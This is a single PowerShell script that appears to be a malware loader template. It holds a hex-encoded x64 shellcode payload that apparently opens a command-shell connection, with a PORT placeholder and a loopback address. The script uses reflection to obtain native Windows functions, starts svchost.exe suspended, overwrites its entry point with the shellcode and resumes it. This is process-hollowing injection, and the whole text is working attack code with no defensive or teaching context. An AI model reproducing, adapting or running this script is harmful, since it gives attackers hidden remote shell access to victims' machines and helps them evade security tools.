[Byte[]]$SHELLCODE = (((/fc 48 83 e4 f0 e8 c0 00 00 00 41 51 41 50 52 51/)+(/ 56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52 20 48 8b 72 50 48 0f b7 4a 4a 4d 31 c9 48 31 c0 ac 3c 61 7c 02 2c 20 41 c1 c9 0d 41 01 c1 e2 ed 52 41 51/)+(/ 48 8b 52 20 8b 42 3c 48 01 d0 8b 80 88 00 00 00 48 85 c0 74 67 48/)+(/ 01 d0 50 8b 48 18 44 8b 40 20 49 01 d0 e3 56 48 ff c9 41 8b 34 88 48 01 d6 4d 31 c9 48 31 c0 ac 41 c1 c9 0d 41 01 c1 38 e0 75 f1 4c 03 4c 24 08 45 39/)+(/ d1 75 d8 58 44 8b 40 24 49 01 d0 66 41 8b 0c 48 44 8b 40 1c 49 01 d0/)+(/ 41 8b 04 88 48 01 d0 41 58 41 58 5e 59 5a 41 58 41 59 41 5a 48 83 ec 20 41 52 ff e0 58 41 59 5a 48 8b 12 e9 57 ff ff ff 5d 49 be 77 73 32 5f 33 32/)+(/ 00 00 41 56 49 89 e6 48 81 ec a0 01 00 00 49 89 e5 49 bc 02 00/)+(/PORT/)+(/ 7f 00 00 01/)+(/ 41 54 49 89 e4 4c 89 f1 41 ba 4c 77 26 07 ff d5 4c 89 ea 68 01 01 00 00 59 41 ba 29 80 6b 00 ff d5 50 50 4d 31 c9 4d 31 c0 48 ff c0 48/)+(/ 89 c2 48 ff c0 48 89 c1 41 ba ea 0f df e0 ff d5 48 89 c7 6a 10 41 58 4c 89/)+(/ e2 48 89 f9 41 ba 99 a5 74 61 ff d5 48 81 c4 40 02 00 00 49 b8 63 6d 64 00 00 00 00 00 41 50 41 50 48 89 e2 57 57 57 4d 31 c0 6a 0d 59 41 50/)+(/ e2 fc 66 c7 44 24 54 01 01 48 8d 44 24 18 c6 00 68 48 89 e6 56 50 41 50 41 50/)+(/ 41 50 49 ff c0 41 50 49 ff c8 4d 89 c1 4c 89 c1 41 ba 79 cc 3f 86 ff d5 48 31 d2 48 ff ca 8b 0e 41 ba 08 87 1d 60 ff d5 bb f0 b5 a2 56 41/)+(/ ba a6 95 bd 9d ff d5 48 83 c4 28 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f 6a 00/)+(/ 59 41 89 da ff d5/))) -split ' '|% { [Convert]::ToByte($_, 16) }; filter Get-Type ([string]$dllName,[string]$typeName){if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) ){$_.GetType($typeName)}} function Get-Function{Param([string] $modVarule,[string] $Varfunction); if( ($null -eq $GetModuleHandleVar) -or ($null -eq $GetProcAddressVar) ){throw ""}$VarmoduleHandle = $GetModuleHandleVar.Invoke($null, @($modVarule));$GetProcAddressVar.Invoke($null, @($VarmoduleHandle, $Varfunction))}; function Get-Delegate{Param ([Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,[Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,[Parameter(Position = 2)] [Type] $retVarType = [Void]);$typeVar = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('QM', $false).DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]);$typeVar.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed');$typeVar.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retVarType, $argTypes).SetImplementationFlags('Runtime, Managed'); $delegateVar = $typeVar.CreateType();[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegateVar)};$1assemblies=[AppDomain]::CurrentDomain.GetAssemblies(); $2unsafeMethodsType=$1assemblies|&(/Get-Type/)(/System.dll/)(/Microsoft.Win32.UnsafeNativeMethods/);$3nativeMethodsType=$1assemblies|&(/Get-Type/)(/System.dll/)(/Microsoft.Win32.NativeMethods/);$4startupInformationType=$1assemblies|&(/Get-Type/)(/System.dll/)(/Microsoft.Win32.NativeMethods+STARTUPINFO/);$5processInformationType=$1assemblies|&(/Get-Type/)(/System.dll/)(/Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION/);$GetModuleHandleVar=$2unsafeMethodsType.GetMethod((/GetModuleHandle/));$GetProcAddressVar=$2unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);;$6CreateProcess = $3nativeMethodsType.GetMethod("CreateProcess"); $7ResumeThreadAddr=&(/Get-Function/)(/kernel32.dll/)"ResumeThread"; $8ReadProcessMemoryAddr=&(/Get-Function/)(/kernel32.dll/)(/ReadProcessMemory/); $9WriteProcessMemoryAddr=&(/Get-Function/)(/kernel32.dll/)(/WriteProcessMemory/); $8ZwQueryInformationProcessAddr=&(/Get-Function/)(/ntdll.dll/)(/ZwQueryInformationProcess/); $3ResumeThread=&(/Get-Delegate/)$7ResumeThreadAddr @([IntPtr]); $6WriteProcessMemory=&(/Get-Delegate/)$9WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr]); $ReadProcessMemory1=&(/Get-Delegate/)$8ReadProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]); $ZwQueryInformationProcess2=&(/Get-Delegate/)$8ZwQueryInformationProcessAddr @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int]); $startupInformation3=$4startupInformationType.GetConstructors().(/Invoke/)($null); $processInformation4=$5processInformationType.GetConstructors().Invoke($null); $cmd=[System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe"); $6CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation3, $processInformation4)); $hThread5=$processInformation4.hThread; $hProcess6=$processInformation4.hProcess; $processBasicInformation7= [System.Byte[]]::CreateInstance([System.Byte],48); $ZwQueryInformationProcess2.Invoke($hProcess6,0,$processBasicInformation7,$processBasicInformation7.Length, 0); $imageBaseAddrPEB= ([IntPtr]::new([BitConverter]::ToUInt64($processBasicInformation7, 0x08) + 0x10)); $memoryBuffer= [System.Byte[]]::CreateInstance([System.Byte], 0x200); $ReadProcessMemory1.Invoke($hProcess6, $imageBaseAddrPEB, $memoryBuffer, 0x08, 0); $imageBaseAddr9 = [BitConverter]::ToInt64($memoryBuffer, 0); $imageBaseAddrPointer = [IntPtr]::new($imageBaseAddr9); $ReadProcessMemory1.Invoke($hProcess6, $imageBaseAddrPointer, $memoryBuffer, $memoryBuffer.Length, 0); $peOffset= [BitConverter]::ToUInt32($memoryBuffer, 0x3c); $entryPointAddrRelative= [BitConverter]::ToUInt32($memoryBuffer, $peOffset + 0x28); $entryPointAddr4= [IntPtr]::new($imageBaseAddr9 + $entryPointAddrRelative); $6WriteProcessMemory.(/Invoke/)($hProcess6, $entryPointAddr4, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero); $3ResumeThread.(/Invoke/)($hThread5); exit